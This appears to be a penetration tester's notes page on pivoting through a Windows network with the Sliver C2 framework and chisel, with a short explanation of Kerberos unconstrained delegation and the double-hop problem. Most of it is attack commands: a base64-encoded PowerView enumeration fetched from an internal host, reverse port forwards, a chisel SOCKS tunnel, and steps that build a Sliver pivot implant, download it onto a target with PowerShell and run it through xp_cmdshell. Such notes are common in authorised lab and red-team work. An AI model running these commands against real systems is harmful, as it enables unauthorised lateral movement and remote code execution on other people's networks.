# Pivot

### <mark style="color:yellow;">Kerberos Delegations</mark>

In case of need to bypass network restrictions we can add a reverse portforward.

```sh
rportfwd add -b 8080 -r 127.0.0.1:8080
```

<details>

<summary>Double Hop problem</summary>

Double Hop problem. The double-hop problem in authentication occurs when a user accesses a front-end service (like IIS) that needs to authenticate to a back-end service (like MSSQL) on behalf of the user.\\

Unconstrained delegation allows the front-end service (IIS) to act as the user for any service on the network. Here’s how it works:

1. **TGT Inclusion**: When the user authenticates to the IIS server, the KDC includes the user's TGT in the service ticket issued to the IIS server.
2. **TGT Caching**: The IIS server extracts and caches the user's TGT in memory.
3. **Impersonation**: With the cached TGT, the IIS server can request tickets to access other services (like MSSQL) on behalf of the user without needing the user's credentials again

</details>

Then run Powerview to enum for unconstrained delegations

```sh
sharpsh -- '-u http://172.16.1.11:8080/PowerView.ps1 -e -c R2V0LU5ldENvbXB1dGVyIC1VbmNvbnN0cmFpbmVkCg=='
```

### <mark style="color:yellow;">Setting up chisel</mark>

Have a valid sessions running on sliver. The use the id from there to connect the ./sliver-client. For sliver client to run create a new operator in sliver `new-operator -n mczen -l 10.10.14.120`.

```sh
cd ~/sliver
sudo apt install mingw-w64
git clone https://github.com/MrAle98/chisel
cd chisel/
mkdir ~/.sliver-client/extensions/chisel
cp extension.json ~/.sliver-client/extensions/chisel/
make windowsdll_64
make windowsdll_32
```

The start chisel server

<pre class="language-shell"><code class="lang-shell"># Set proxychains4.conf
sudo sh -c 'sed -i s/socks4/socks5/g /etc/proxychains4.conf &#x26;&#x26; sed -i s/9050/1080/g /etc/proxychains4.conf'

<strong># Start server
</strong>chisel server --reverse -v --socks5
</code></pre>

In ./chisel-client

```sh
# First make new profile
new-operator -n zen -l 10.10.14.133

# Import profile
./sliver-client_linux import /home/kali/sliver/mczen_10.10.14.120.cfg

# Use ID
use [ID of web01 session]

# Start chisel client from sliver-client
chisel client 10.10.14.120:8080 R:socks
```

### <mark style="color:yellow;">Add reverse port forward</mark>

```sh
rportfwd add -b 8080 -r 127.0.0.1:8080
```

Then create a pivot listener

```sh
# Start tcp
pivots tcp

# Generate and run tcp.exe on target
generate --tcp-pivot 172.16.84.20:9898 --skip-symbols -N tcp

# HTTP server
python3 -m http.server 5000

# Connect
powershell iwr -uri http://172.16.84.20:5000/tcp.exe -Outfile C:\Temp\tcp.exe

# Run .exe 
xp_cmdshell C:\Temp\tcp.exe 
```
